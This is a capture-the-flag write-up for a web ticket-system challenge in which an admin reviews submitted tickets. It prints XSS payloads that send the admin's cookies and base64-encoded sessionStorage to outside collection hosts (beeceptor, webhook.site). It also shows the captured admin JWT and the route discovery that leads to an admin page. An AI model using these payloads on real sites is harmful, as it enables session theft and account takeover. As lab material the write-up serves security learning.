## Description

Level: 3 Score 40 Category web

Our IT department has released a new web based support system. Every user can now create a ticket if she/he needs help. Is that awesome?! And the admins have promised to check every ticket super fast. So don't forget: everybody trust the admin! And the admin trust you! Is that a mistake in the end? Please login with username 'ticket' and password '!H3LP-CNTR90' to create a ticket. Please note: the ticket-system is recreating every hour.

## Analysis

We are given a simple form which allows users to submit tickets,  after submittion the admin will check the ticket.

The attack vector is possibly to steal the admin cookie. The user doesn't have cookie, but could be that admin has.

I used Cookie Stealer XSS from [WebHacking101](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md):
```html
<img src=x  onerror="this.src='https://klgrthio.free.beeceptor.com/?'+document.cookie; this.removeAttribute('onerror');">
```

No luck there. 

It seems like session storage is being used, second attack vector would be Session Hijacking. If we get the admin token, we can essentially log in as admin. `access_token` seems to JWT token, if we had a secret key we could forge different key, but since we don't have it we will steal.

Tweak the payload a bit:<br>
(Beeceptor wasn't working for some reason, so I switched to <https://webhook.site>)

```html
<img  src=x  onerror="this.src='https://webhook.site/<YourID>/?session='+btoa(JSON.stringify(sessionStorage)); this.removeAttribute('onerror');">
```

```
https://webhook.site/<YourID>/?session=eyJhY2Nlc3NfdG9rZW4iOiJleUpoYkdjaU9pSklVelV4TWlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKeWIyeGxJam9pWVdSdGFXNGlMQ0pwYzNNaU9pSmpkR1l0Wkd4aFlpSXNJbUYxWkNJNld5SmpkR1l0Wkd4aFlpNWpiMjBpWFN3aVpYaHdJam94TmpnNU1UY3pNakV4ZlEuN1ZXWTBfd0E2MHo0M0Ftck5NOU0xUVJQaUxscW1vbFA3Z2RlX0wwRFNqdVlvZ1NGb2g0NTNlblFoQnlwa2RiMC13UFpDbFZuLWdJWU1zRUZpVVpDTHciLCJyb2xlIjoiYWRtaW4iLCJ0b2tlbl9kdXJhdGlvbiI6IjE2ODkxNzMyMTEifQ==

    role: "admin",
    token_duration: "1689173211"
}
```

Hmm... I switched the values with admin values, but I see same UI, not much changed. There must be a URI which only admin can visit.

I tried searching for `ticket` (known URI) in the `main.9902a55d1e62a36b.js` (Can be accessed from "sources"). After some searching I found what seems to be routes. 

1. login -> To login 
2. ticket -> To create ticket
3. admin/:id -> View ticket (Accessible by admin)
4. Anything else -> Redirects to login (That's why `/ticket/TicketID` didn't work)

```js
        const N3 = [{
            path: "login",
            component: F3
        }, {
            path: "admin/:id",
            component: I3,
            canActivate: [Fg, oA]
        }, {
            path: "ticket",
            component: O3,
            canActivate: [Fg]
        }, {
            path: "**",
            redirectTo: "/login"
        }];
```

## Solution

1. Hijack admin session by using XSS.
2. Create a ticket
3. Visit `/admin/TicketID`:
